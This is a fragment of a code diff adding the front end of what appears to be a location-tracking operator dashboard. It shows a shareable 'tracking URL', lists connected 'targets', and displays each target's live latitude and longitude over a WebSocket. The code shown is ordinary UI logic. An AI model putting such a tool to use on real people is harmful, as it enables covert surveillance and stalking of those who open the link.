+            const latEl = document.getElementById(`lat-${escapeId(id)}`);
+            const lngEl = document.getElementById(`lng-${escapeId(id)}`);
+            const pingEl = document.getElementById(`ping-${escapeId(id)}`);
+            if (latEl) latEl.textContent = parseFloat(lat).toFixed(6);
+            if (lngEl) lngEl.textContent = parseFloat(lng).toFixed(6);
+            if (pingEl) pingEl.textContent = 'Updated ' + new Date().toLocaleTimeString('en-GB', { hour12: false });
+        }
+
+        // ===== Search filtering =====
+        searchInput.addEventListener('input', () => {
+            const query = searchInput.value.trim().toLowerCase();
+            const cards = targetsGrid.querySelectorAll('.target-card');
+            cards.forEach(card => {
+                const idEl = card.querySelector('.target-id');
+                if (!idEl) return;
+                const id = idEl.textContent.toLowerCase();
+                card.style.display = id.includes(query) ? '' : 'none';
+            });
+        });
+
+        // ===== Copy URL =====
+        document.getElementById('copyUrlBtn').addEventListener('click', async () => {
+            const url = document.getElementById('trackingUrl').textContent.trim();
+            try {
+                await navigator.clipboard.writeText(url);
+                const btn = document.getElementById('copyUrlBtn');
+                const btnText = document.getElementById('copyBtnText');
+                btn.classList.add('copied');
+                btnText.textContent = 'Copied!';
+                setTimeout(() => {
+                    btn.classList.remove('copied');
+                    btnText.textContent = 'Copy URL';
+                }, 2000);
+                showToast('Tracking URL copied to clipboard.', 'success');
+            } catch (e) {
+                showToast('Could not copy: clipboard not available.', 'warn');
+            }
+        });
+
+        // ===== Refresh =====
+        document.getElementById('refreshBtn').addEventListener('click', () => {
+            location.reload();
+        });
+
+        // ===== Clear log =====
+        document.getElementById('clearLogBtn').addEventListener('click', () => {
+            terminalBody.innerHTML = '';
+            addLog('INFO', 'Log cleared by operator.');
+        });
+
+        // ===== WebSocket =====
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        });
+
+        socket.on('connect', () => {
+            addLog('OK', 'WebSocket connected. Session: ' + socket.id);
+        });
+
+        socket.on('disconnect', (reason) => {
+            addLog('WARN', 'WebSocket disconnected: ' + reason);
+            showToast('Connection lost — attempting to reconnect.', 'warn');
+        });
+
+        socket.on('user-connected', newId => {
+            if (!knownTargets[newId]) {
+                addTargetCard(newId);
+                addActivity('New target connected:', newId, 'var(--accent-green)');
+                addLog('OK', 'New target acquired: ' + newId);
+                showToast('New target online: ' + newId, 'success');
+            }
+        });
+
+        socket.on('map-data', data => {
+            updateCardCoords(data.id, data.lat, data.lng);
+            addLog('INFO', 'Location update — ' + data.id + ' → ' + parseFloat(data.lat).toFixed(5) + ', ' + parseFloat(data.lng).toFixed(5));
+        });
+
+        // ===== Utility =====
+        function escapeHtml(str) {
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
+        // Produce a safe CSS id from an arbitrary string
+        function escapeId(str) {
+            return String(str).replace(/[^a-zA-Z0-9_-]/g, '_');
+        }
+    </script>
+</body>
+
+</html>
